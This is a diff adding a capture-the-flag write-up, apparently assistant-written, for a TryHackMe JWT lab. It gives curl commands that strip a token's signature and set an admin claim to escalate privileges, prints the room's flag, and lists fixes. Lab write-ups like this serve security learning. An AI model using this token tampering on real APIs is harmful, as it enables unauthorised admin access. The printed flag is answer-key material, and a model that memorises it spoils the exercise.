@@ -110,4 +110,56 @@ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZ
 - Check if weak JWT secrets allow forging new tokens.  
 - Securely document findings and commit to GitHub.
 
+Boom! 🎉 **Success, John!** You **exploited the JWT vulnerability** and gained admin access—nicely done. 🚀  
+
+### **🔑 Flag Retrieved:**  
+✅ **THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}**  
+
+---
+
+### **📌 Key Takeaways from This Exploit:**  
+🔹 **Signature validation was not enforced**, allowing you to modify the JWT freely.  
+🔹 **Admin escalation worked**, proving the API trusts tokens without verifying integrity.  
+🔹 **This is a serious security risk**—an attacker could forge identities without needing the secret key.  
+```markdown
+## Task 5 - JWT Manipulation Exploit
+
+### 🔍 Issue Found:
+- API **does not verify the JWT signature**, allowing token tampering.
+- A user can **modify claims (e.g., "admin": 0 → "admin": 1)** to escalate privileges.
+
+### 🚀 Exploit Steps:
+1️⃣ **Authenticated & retrieved JWT** using:
+```bash
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://jwt.thm/api/v1.0/example2
+```
+2️⃣ **Removed the JWT signature** and verified user:
+```bash
+curl -H 'Authorization: Bearer [JWT_HEADER].[JWT_PAYLOAD].' http://jwt.thm/api/v1.0/example2?username=user
+```
+✅ **API accepted unsigned JWT**, proving weak validation.
+3️⃣ **Modified JWT payload to escalate privileges**:
+```json
+{
+  "username": "user",
+  "admin": 1
+}
+```
+4️⃣ **Sent the modified JWT in an API request** to retrieve the flag:
+```bash
+curl -H 'Authorization: Bearer MODIFIED.JWT.TOKEN' http://jwt.thm/api/v1.0/example2?username=admin
+```
+✅ **Flag Retrieved**: `THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}` 🎉
+
+### 🔥 Security Risks:
+🚨 **JWT integrity is broken** → Tokens can be freely altered.  
+🚨 **Privilege escalation is possible** → No need to crack the secret key.  
+🚨 **Attackers can forge any identity** → Anyone can pose as an admin.
+
+### 🛠️ Suggested Fix:
+✅ Always enforce **signature validation** before accepting JWTs.  
+✅ Implement **proper admin access controls**, rather than trusting JWT alone.  
+✅ Use **asymmetric JWT signing** (e.g., RS256) for stronger security.
+
+
 
